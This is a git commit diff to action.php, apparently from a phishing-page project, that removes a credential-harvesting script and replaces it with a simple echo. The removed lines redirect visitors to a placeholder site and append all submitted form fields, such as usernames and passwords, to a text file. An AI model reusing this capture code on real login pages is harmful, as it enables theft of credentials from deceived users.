468f30a65d5b14f711dc993f554f8486583e52dc
loginer <51517929+loginer1@users.noreply.github.com>
2022-01-25 03:11:17 +0300

    Update action.php

--- action.php
+++ action.php
@@ -1,13 +1,3 @@
 <?php
-header ('Location:-The site you are using- ');
-$handle = fopen('usernames.txt', 'a');
-foreach($_POST as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, '=');
-fwrite($handle, $value);
-fwrite($handle, 'rn');
-}
-fwrite($handle, 'rn');
-fclose($handle);
-exit;
+echo "qwe";
 ?> 
